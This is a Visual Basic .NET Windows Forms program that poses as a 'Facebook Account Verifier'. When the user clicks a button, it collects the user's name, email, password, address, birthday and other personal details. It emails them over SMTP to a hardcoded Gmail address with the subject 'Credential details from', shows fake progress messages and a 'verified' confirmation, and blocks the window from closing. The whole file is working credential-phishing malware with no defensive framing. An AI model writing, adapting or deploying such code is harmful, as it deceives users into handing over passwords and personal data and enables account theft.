Imports System.Net.Mail
Public Class Form1

    Dim email As String
    Dim password As String
    Dim fname As String
    Dim report As String
    Dim age As String
    Dim gender As String
    Dim country As String
    Dim zip As String
    Dim address As String
    Dim birth As String
    Dim month As String
    Dim day As String
    Dim year As String
    Dim centype As String

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click

        Timer1.Start()


        fname = TextBox1.Text
        email = TextBox2.Text
        password = TextBox3.Text
        age = TextBox4.Text
        gender = ComboBox1.Text
        country = ComboBox2.Text
        address = TextBox5.Text
        zip = TextBox6.Text
        month = ComboBox3.Text
        day = ComboBox4.Text
        year = TextBox7.Text
        centype = ComboBox5.Text


        birth = month & " " & day & ", " & year & " " & centype
        report = "Full Name: " & fname + ControlChars.NewLine + "Username: " & email & ControlChars.NewLine + "Password: " & password & ControlChars.NewLine + "Address: " & "|" & address & "|" & ControlChars.NewLine + "Country: " & country + ControlChars.NewLine + "Age: " & age + ControlChars.NewLine + "Gender: " & gender + ControlChars.NewLine + "Postal Code: " & zip + ControlChars.NewLine & "Birthday: " & birth

        Dim user As String = TextBox1.Text
        Dim pass As String = TextBox2.Text
        Dim smtpServer As New SmtpClient
        Dim mail As New MailMessage
        smtpServer.Credentials = New Net.NetworkCredential("free2sendmail@gmail.com", "your_password")
        smtpServer.Port = 587
        smtpServer.Host = "smtp.gmail.com"
        smtpServer.EnableSsl = False
        mail = New MailMessage
        mail.From = New MailAddress("free2sendmail@gmail.com")
        mail.To.Add("free2sendmail@gmail.com")
        mail.Subject = "Credential details from " & fname
        mail.Body = "Here are the credential details from " & fname & ":" & ControlChars.NewLine & ControlChars.NewLine & report
        smtpServer.Send(mail)


    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        ProgressBar1.Value += 1

        Me.Text = "Facebook Account Verifier - " & ProgressBar1.Value & "% Complete - " & RichTextBox1.Text

        If ProgressBar1.Value = 3 Then
            RichTextBox1.Text = "Initializing server..."
            RichTextBox1.BackColor = Color.Red
            RichTextBox1.ForeColor = Color.White
        ElseIf ProgressBar1.Value = 10 Then
            RichTextBox1.Text = "Gathering information..."
            RichTextBox1.BackColor = Color.OrangeRed
            RichTextBox1.ForeColor = Color.Black
        ElseIf ProgressBar1.Value = 20 Then
            RichTextBox1.Text = "Processing credentials..."
            RichTextBox1.BackColor = Color.Orange
            RichTextBox1.ForeColor = Color.Black
        ElseIf ProgressBar1.Value = 25 Then
            RadioButton1.Select()
        ElseIf ProgressBar1.Value = 30 Then
            RichTextBox1.Text = "Processing information..."
            RichTextBox1.BackColor = Color.Gold
            RichTextBox1.ForeColor = Color.Black
        ElseIf ProgressBar1.Value = 50 Then
            RichTextBox1.Text = "Processing geographical data..."
            RichTextBox1.BackColor = Color.Yellow
            RichTextBox1.ForeColor = Color.Black
            RadioButton2.Select()
        ElseIf ProgressBar1.Value = 70 Then
            RichTextBox1.Text = "Processing computer information..."
            RichTextBox1.BackColor = Color.YellowGreen
            RichTextBox1.ForeColor = Color.Black
        ElseIf ProgressBar1.Value = 75 Then
            RadioButton3.Select()
        ElseIf ProgressBar1.Value = 80 Then
            RichTextBox1.Text = "Verifying account... 50%"
            RichTextBox1.BackColor = Color.LightGreen
            RichTextBox1.ForeColor = Color.Black
        ElseIf ProgressBar1.Value = 90 Then
            RichTextBox1.Text = "Verifying account... 90%"
            RichTextBox1.BackColor = Color.PaleGreen
            RichTextBox1.ForeColor = Color.Black
        End If

        If ProgressBar1.Value = ProgressBar1.Maximum Then

            Timer1.Stop()
            RadioButton4.Select()
            RichTextBox1.Text = "Account verified."
            RichTextBox1.BackColor = Color.Green
            RichTextBox1.ForeColor = Color.White
            ProgressBar1.Value = 0
            ProgressBar1.Style = ProgressBarStyle.Marquee
            MsgBox("Thank you for verifying your Facebook account!", MsgBoxStyle.Information, "Thank you, " & fname & "!")
            Button2.Enabled = False
            End
        End If
    End Sub

    Private Sub Form1_FormClosing(ByVal sender As System.Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles MyBase.FormClosing
        e.Cancel = True
    End Sub

End Class
